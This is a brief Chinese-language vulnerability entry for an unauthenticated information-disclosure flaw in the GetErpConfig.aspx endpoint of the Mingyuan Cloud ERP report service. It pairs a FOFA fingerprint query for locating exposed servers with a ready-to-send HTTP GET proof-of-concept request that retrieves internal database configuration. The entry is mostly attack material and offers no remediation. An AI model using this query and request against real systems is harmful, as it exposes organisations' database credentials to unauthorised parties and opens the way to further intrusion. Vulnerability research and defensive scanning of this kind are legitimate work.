# 明源云GetErpConfig.aspx信息泄露漏洞

明源云ERP报表服务 GetErpConfig.aspx 接口存在信息泄露漏洞，未经身份验证的远程攻击者可利用此漏洞获取内部数据库敏感配置信息，导致系统处于极不安全的状态。

## fofa

```javascript
body="报表服务已正常运行"
```

## poc

```javascript
GET /service/Mysoft.Report.Web.Service.Base/GetErpConfig.aspx?erpKey=erp60 HTTP/1.1
Host: 
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept: application/json, text/javascript, */*; q=0.01
Accept-Encoding: gzip, deflate
Connection: keep-alive
```

